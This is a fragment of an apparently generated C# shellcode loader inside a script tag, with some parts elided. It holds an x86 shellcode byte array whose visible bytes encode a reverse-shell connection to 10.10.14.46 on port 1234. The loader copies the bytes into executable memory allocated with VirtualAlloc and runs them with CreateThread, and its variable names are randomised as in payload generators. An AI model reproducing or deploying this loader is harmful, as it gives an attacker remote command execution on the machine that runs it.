...
0x68,0x0a,0x0a,0x0e,0x2e,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr cmAoG = VirtualAlloc(IntPtr.Zero,(UIntPtr)hcG0Lrggx.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(hcG0Lrggx,0,cmAoG,hcG0Lrggx.Length);
        IntPtr kQEZ21RD = IntPtr.Zero;
        IntPtr sezF_9 = CreateThread(IntPtr.Zero,UIntPtr.Zero,cmAoG,IntPtr.Zero,0,ref kQEZ21RD);
    }
</script>
